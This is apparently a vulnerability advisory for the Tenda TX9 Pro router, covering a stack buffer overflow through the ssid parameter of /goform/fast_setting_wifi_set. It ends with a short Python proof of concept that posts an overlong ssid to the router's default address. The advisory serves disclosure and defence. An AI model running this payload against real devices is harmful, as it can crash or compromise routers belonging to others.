# Tenda TX9 Pro fast_setting_wifi_set
### Overview
vendor: Tenda

product: TX9 Pro

version: V22.03.02.10_multi

type: Buffer Overflow

### Vulnerability Description
A vulnerability has been found in Tenda TX9 Pro V22.03.02.10_multi. This vulnerability can be triggered through the route /goform/fast_setting_wifi_set. The manipulation of the argument ssid leads to buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.
### Vulnerability Details
In function sub_432580 line 26, it reads in a user-provided parameter `ssid`. The variable `Var` is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `v19`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](./images/1.png)

### POC
```python
import requests
url = 'http://192.168.0.1/goform/fast_setting_wifi_set'
headers = {
    'Host': '192.168.0.1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
}
data = {
    'ssid': 'a' * 1000
}
response = requests.post(url, headers=headers, data=data)
```